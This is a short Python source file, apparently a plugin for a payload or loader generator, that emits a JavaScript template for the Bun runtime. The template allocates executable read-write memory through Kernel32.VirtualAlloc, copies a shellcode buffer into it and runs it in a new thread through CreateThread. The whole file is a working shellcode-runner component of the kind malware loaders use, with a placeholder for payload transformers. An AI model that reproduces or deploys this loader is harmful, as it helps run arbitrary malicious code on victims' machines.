from string import Template

class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ['import Kernel32 from "@bun-win32/kernel32";', 
                'import { toArrayBuffer } from "bun:ffi";']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return """"""

    def template(self) -> str:
        return """
    {transformers}

    const address = Kernel32.VirtualAlloc(0, {shellcodeSize}, 0x3000, 0x40);

    const buffer = new Uint8Array(toArrayBuffer(Number(address), 0, {shellcodeSize}));

    buffer.set(shellcode);

    const hThread = Kernel32.CreateThread(0, 0, address, 0, 0, 0);

    Kernel32.WaitForSingleObject(hThread, -1);
"""